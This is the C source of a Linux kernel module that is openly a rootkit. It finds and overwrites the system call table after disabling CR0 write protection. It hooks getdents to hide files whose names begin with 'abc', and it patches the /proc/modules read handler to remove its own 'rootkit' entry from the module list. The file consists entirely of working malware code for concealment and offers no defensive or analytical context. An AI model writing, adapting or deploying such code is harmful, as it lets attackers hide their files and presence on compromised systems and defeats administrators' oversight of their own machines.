#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>
#include <linux/string.h>

#include <linux/mm.h>
#include <asm/unistd.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");


// Copy and paste struct declaration so we can use it here
struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};


// Prototypes and global variables
unsigned long **sys_call_table;
unsigned long original_cr0;
static struct file_operations *proc_modules_operations;
asmlinkage long (*old_sys_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static ssize_t (*procfs_read_old)(struct file *filp, char *buffer, size_t length, loff_t * offset);


// Our new function to handle the getdents system call
asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count) {
    long ret;
    int offset;
    struct linux_dirent *entry;
    char *original = (char *)dirent;
    int dest, src, num_bytes;

    ret = old_sys_getdents(fd, dirent, count);

    // Variables to shift the data
    entry = dirent;

    offset = 0;
    while(offset < ret){
        entry = (struct linux_dirent*)(original + offset);
        // Don't show anything that starts with "abc"
        if((strncmp(entry->d_name, "abc", 3) == 0)) {
            dest = original + offset;
            src = original + offset + entry->d_reclen;
            num_bytes = ret - offset - entry->d_reclen; // Total - start - entrySize
            // Copy the data from the next entry onwards to the location of the current entry
            memcpy(dest, (void *)src, num_bytes);
            // Update the total size of the data
            ret -= entry->d_reclen;
        }
        else{ // Go to next entry. Don't do this because we want to go back to the same memory
            offset += entry->d_reclen;
        }
    }

    return ret;
}


static ssize_t procfs_read_new(struct file *filp, char __user *buf, size_t len, loff_t *ppos) {
    char* bad_line = NULL;
    char* bad_line_end = NULL;
    ssize_t ret = procfs_read_old(filp, buf, len, ppos);
    bad_line = strnstr(buf, "rootkit", ret);
    if (bad_line != NULL) {
        for (bad_line_end = bad_line; bad_line_end < (buf + ret); bad_line_end++) {
            if (*bad_line_end == '\n') {
                bad_line_end++;
                break;
            }
        }
        memcpy(bad_line, bad_line_end, (buf+ret) - bad_line_end);
        ret -= (ssize_t)(bad_line_end - bad_line);
    }

    return ret;
}

// Find the address of the system call table to offset from
static unsigned long **aquire_sys_call_table(void)
{
    // PAGE_OFFSET is where kernel memory is designed to start
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    while (offset < ULLONG_MAX) {
        sct = (unsigned long **)offset;

        if (sct[__NR_close] == (unsigned long *) sys_close)
            return sct;

        offset += sizeof(void *);
    }

    return NULL;
}

static struct file_operations *aquire_proc_modules(void){
    // Automate if necessary. Found with following command:
    // cat /boot/System.map-`uname -r` | grep proc_modules_operations
    return 0xffffffff81a19fe0;
}

// Runs when the module is first inserted
static int __init interceptor_start(void)
{
    // We must first find where in the sys_call table the original system call is located
    if(!(sys_call_table = aquire_sys_call_table())) {
        return -1;
    }

    proc_modules_operations = aquire_proc_modules();
    procfs_read_old = proc_modules_operations->read;

    // We first find out what the CR0 register permissions are, then turn off write protection
    // so that we can modify the sys_call_table.
    original_cr0 = read_cr0();
    write_cr0(original_cr0 & ~0x00010000);

    // Go in, save the pointer to the old system call, and perform the update
    // to point to our new system call
    old_sys_getdents = (void *)sys_call_table[__NR_getdents];
    sys_call_table[__NR_getdents] = (unsigned long *)new_sys_getdents;

    // Now change the proc_modules_operations which stores the functions that handle proc requests
    proc_modules_operations->read = procfs_read_new;

    // We can now re-enable write protection
    write_cr0(original_cr0);

    return 0;
}


// Runs when the module is removed
static void __exit interceptor_end(void)
{
    // Check and make sure that the system call was found
    if(!sys_call_table) {
        return;
    }
    // Re-disable write protection, then change the system call back, then re-enable write protection
    write_cr0(original_cr0 & ~0x00010000);
    sys_call_table[__NR_getdents] = (unsigned long *)old_sys_getdents;

    // Reset the proc read function
    proc_modules_operations->read = procfs_read_old;

    write_cr0(original_cr0);


}

// Initialize our function
module_init(interceptor_start);
module_exit(interceptor_end);
